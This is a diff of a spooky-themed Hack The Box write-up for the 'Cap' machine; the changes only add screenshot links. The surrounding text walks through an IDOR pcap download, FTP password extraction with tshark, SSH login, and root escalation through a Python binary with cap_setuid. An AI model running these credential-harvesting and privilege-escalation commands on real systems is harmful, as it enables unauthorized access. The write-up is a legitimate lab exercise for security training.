@@ -21,9 +21,13 @@ curl http://10.10.10.245/data/0 -o haunted.pcap
 PCAP Ghost Whispering
 → Heard credentials whispering in the packets: Often times when a there is an ID/# we can run other ID's to see what we can find.
 
+![Alt text](Cap/1.png)
+
 Step 2
 tshark -r haunted.pcap -Y "ftp contains 'PASS'" -Tfields -e ftp.request.arg
 → "The spirits say: User/Password 🎃
+
+![Alt text](/HTB_Writeups/Screenshot 2024-04-20 054546.png)
 
 SSH Apparition
 → Materialized into Nathan's account: Use the previously discovered login credentials.
@@ -37,15 +41,21 @@ cat user.txt
 Capability Ghostbusting
 → Detected haunted Python binary:
 
+![Alt text](/HTB_Writeups/Screenshot 2024-04-20 054546.png)
+
 Step 1
 getcap -r / 2>/dev/null
 # /usr/bin/python3.8 = cap_setuid+ep 🕷️
 Poltergeist Privileges
 → Exorcised root privileges:
 
+![Alt text](/HTB_Writeups/Screenshot 2024-04-20 054546.png)
+
 Step 2
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 → "The power of root compels you!" 🎃
+
+![Alt text](/HTB_Writeups/Screenshot 2024-04-20 054546.png)
 
 Flag Finale
 → Banished root flag from /root:
